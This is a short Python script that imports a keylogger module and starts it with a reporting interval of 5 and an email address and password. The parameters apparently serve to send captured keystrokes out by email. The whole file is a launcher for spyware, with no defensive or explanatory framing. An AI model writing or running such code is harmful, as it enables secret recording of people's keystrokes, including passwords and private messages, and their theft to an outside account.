#!/usr/bin/env python
import keylogger

keylogger_app = keylogger.Keylogger(5, "email@example.com", "password")
keylogger_app.start()
